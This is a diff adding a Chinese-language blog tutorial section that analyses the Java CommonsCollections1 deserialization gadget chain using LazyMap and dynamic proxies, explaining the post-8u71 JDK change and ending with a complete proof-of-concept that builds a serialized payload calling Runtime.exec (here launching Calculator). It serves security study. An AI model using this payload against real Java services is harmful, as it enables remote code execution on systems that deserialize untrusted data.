@@ -520,3 +520,267 @@ public static AnnotationType getInstance(Class<? extends Annotation> var0) {
 
 至此，CommonCollection1利用链我们就已经分析结束了
 
+
+
+# LazyMap
+
+前一篇文章说了，我们所测试的jdk版本是8u71以前的版本，而此版本以后的jdk，Java 官方修改了 sun.reflect.annotation.AnnotationInvocationHandler 的 readObject函数
+
+变成了如下代码
+
+```java
+    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
+        GetField var2 = var1.readFields();
+        Class var3 = (Class)var2.get("type", (Object)null);
+        Map var4 = (Map)var2.get("memberValues", (Object)null);
+        AnnotationType var5 = null;
+
+        try {
+            var5 = AnnotationType.getInstance(var3);
+        } catch (IllegalArgumentException var13) {
+            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
+        }
+
+        Map var6 = var5.memberTypes();
+        LinkedHashMap var7 = new LinkedHashMap();
+
+        String var10;
+        Object var11;
+        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
+            Entry var9 = (Entry)var8.next();
+            var10 = (String)var9.getKey();
+            var11 = null;
+            Class var12 = (Class)var6.get(var10);
+            if (var12 != null) {
+                var11 = var9.getValue();
+                if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) {
+                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
+                }
+            }
+        }
+
+        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);
+        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);
+    }
+```
+
+他让我们传入的Map不会再执行set或put操作了，所以这里就不能再用了
+
+观察ysoserial中的CC1的payload，可以发现这里用的不是我们上一篇文章介绍到的TransformedMap而是LazyMap
+
+![image-20220930152414864](https://tuchuang.huamang.xyz/img/image-20220930152414864.png)
+
+那我们先来研究一下这个LazyMap
+
+LazyMap和TransformedMap的区别在于，TransformedMap触发transform的地方在于Map的写入操作，LazyMap触发transform的操作是在他的get方法中执行`this.factory.transform(key);`
+
+```java
+    public Object get(Object key) {
+        if (!super.map.containsKey(key)) {
+            Object value = this.factory.transform(key);
+            super.map.put(key, value);
+            return value;
+        } else {
+            return super.map.get(key);
+        }
+    }
+```
+
+而且factory是可控的
+
+```java
+    public static Map decorate(Map map, Transformer factory) {
+        return new LazyMap(map, factory);
+    }
+
+    protected LazyMap(Map map, Transformer factory) {
+        super(map);
+        if (factory == null) {
+            throw new IllegalArgumentException("Factory must not be null");
+        } else {
+            this.factory = factory;
+        }
+    }
+```
+
+我们要使用的话只需要把Map和transformerChain传入即可
+
+```
+Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+```
+
+但是这样一来，我们之前的AnnotationInvocationHandler的readObject就不行了，这里我们看看ysoserial的Gadget
+
+```java
+	Gadget chain:
+		ObjectInputStream.readObject()
+			AnnotationInvocationHandler.readObject()
+				Map(Proxy).entrySet()
+					AnnotationInvocationHandler.invoke()
+						LazyMap.get()
+							ChainedTransformer.transform()
+								ConstantTransformer.transform()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Class.getMethod()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.getRuntime()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.exec()
+```
+
+可以看到这里是用的一个`AnnotationInvocationHandler.invoke()`
+
+![image-20220930171136527](https://tuchuang.huamang.xyz/img/image-20220930171136527.png)
+
+那么现在的问题就是如何调用到这个invoke方法了，可以看到gadget写的是Proxy，这里就涉及到一个Java的技术：**动态代理**
+
+# 动态代理
+
+动态代理的其实很好理解，首先我们知道接口interface是不能直接被实例化的，而是用一个class去实现他，然后实例化类来操作的，那么有一种，不编写实现类，直接在运行期创建某个`interface`实例的技术，他就叫做动态代理
+
+那么要创建一个interface实例的方法就是如下所示：
+
+1. 定义一个`InvocationHandler`实例，它负责实现接口的方法调用
+2. 通过`Proxy.newProxyInstance()`创建interface实例，它需要3个参数：
+	1. 使用的`ClassLoader`，通常就是接口类的`ClassLoader`
+	2. 需要实现的接口数组，至少需要传入一个接口进去
+	3. 用来处理接口方法调用的`InvocationHandler`实例
+3. 将返回的`Object`强制转型为接口
+
+
+
+我们用个例子来理解：
+
+首先我们先实现InvocationHandler接口的invoke方法，invoke的作用就是当ProxyTest1对象执行函数的时候调用，所以这里的意思就是检测执行的方法为get的时候，输出一句Hacked
+
+ProxyTest1.java
+
+```java
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.util.Map;
+
+public class ProxyTest1 implements InvocationHandler {
+    protected Map map;
+    public ProxyTest1(Map map) {
+        this.map = map;
+    }
+    @Override
+    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+        if(method.getName().compareTo("get")==0){
+            System.out.println("Hacked");
+        }
+        return method.invoke(this.map,args);
+    }
+}
+```
+
+然后我们在外部调用ProxyTest1
+
+ProxyTest2.java
+
+```java
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class ProxyTest2 {
+    public static void main(String args[]){
+        InvocationHandler handler = new ProxyTest1(new HashMap());
+        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] {Map.class},handler);
+        proxyMap.put("aaa","bbb");
+        String res = (String) proxyMap.get("aaa");
+        System.out.println(res);
+
+    }
+
+}
+```
+
+![image-20220930205142653](https://tuchuang.huamang.xyz/img/image-20220930205142653.png)
+
+# LazyMap利用链构造
+
+了解了动态代理，我们再回头看看，我们刚才是在想得怎么调用`AnnotationInvocationHandler.invoke()`，我们去翻源码会发现，其实他就是实现了InvocationHandler接口的，那就非常的巧了，我们如果用AnnotationInvocationHandler去代理我设计好的Map的话，那么这个Map执行任意的方法都会走进invoke从而进入我们构造好的链子了
+
+![image-20220930210757525](https://tuchuang.huamang.xyz/img/image-20220930210757525.png)
+
+所以我们可以这样开始写POC了，前面的都是没变的，TransformedMap换成LazyMap
+
+然后用Proxy代理，但是不能直接拿去反序列化，因为我们要入口点是是`sun.reflect.annotation.AnnotationInvocationHandler#readObject`
+
+所以还要用AnnotationInvocationHandler对这个proxyMap进行包裹
+
+```java
+handler = (InvocationHandler) construct.newInstance(Retention.class,
+proxyMap);
+```
+
+最后的POC
+
+```java
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC1pro {
+    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}),
+                new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator" }),
+        };
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
+        construct.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
+        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
+        handler = (InvocationHandler) construct.newInstance(Retention.class,proxyMap);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(handler);
+        oos.close();
+        System.out.println(barr);
+
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object o = (Object)ois.readObject();
+    }
+
+}
+```
+
+# 后记
+
+同样的，CC1依然是不能在高版本运行的，对于高版本的绕过，就在我们的下一篇文章CommonCollection6
+
+
+
+参考文章：
+
+Java安全漫谈
+
+https://ego00.blog.csdn.net/article/details/119705730
+
+https://xz.aliyun.com/t/9873
+
